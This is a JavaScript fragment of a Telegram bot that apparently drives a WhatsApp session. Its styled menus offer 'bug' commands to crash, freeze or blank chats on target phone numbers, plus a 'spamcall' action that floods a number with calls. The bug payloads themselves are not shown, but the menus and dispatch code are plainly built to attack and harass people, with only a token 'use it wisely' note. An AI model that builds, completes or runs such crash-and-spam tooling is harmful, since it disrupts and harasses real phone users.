    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    // Definisi variabel yang belum ada
    let whatsappStatus = true; // Ganti sesuai logic di kode utama
    let getOnlineDuration = () => "1h 23m"; // Placeholder function

    try {
        if (action === "ownermenu") {
            let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ /addbot <Num>
┃ /addprem <ID>
┃ /delprem <ID>
┃ /addowner <ID>
┃ /delowner <ID>
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗡𝗼𝘁𝗲 :
┃ Apabila ada kendala dalam
┃ script ini, segera hubungi
┃ @zyyimupp
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
                caption: ligma,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/zyyimupp"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "bugmenu") {
            let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗕𝘂𝗴 𝗔𝗿𝗲𝗮
┃ ⬡ /XFlow-Delay - 62xxx
┃ ╰➤ Delay Invisible
┃
┃ ⬡ /Flow-Crash - 62xxx
┃ ╰➤ Crash Force Ori
┃
┃ ⬡ /Flower-Freeze - 62xxx
┃ ╰➤ Freeze Delay
┃
┃ ⬡ /XFlower-Blank - 62xxx
┃ ╰➤ Blank Chat
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗡𝗼𝘁𝗲 :
┃ Jangan Di salah gunakan ya
┃ Gunakanlah Dengan Bijak...
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
                caption: ligma,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/zyyimupp"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "toolsmenu") {
            let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝐓𝐨𝐨𝐥𝐬 𝗠𝗲𝗻𝘂
┃ /fixedbug <Num>
┃ /encrypthard <Tag File>
┃ /cooldown <Num>
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗡𝗼𝘁𝗲 :
┃ Apabila ada kendala dalam
┃ script ini, segera hubungi
┃ @zyyimupp
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
                caption: ligma,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/zyyimupp"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);
        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        // Hapus loading di button
        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp()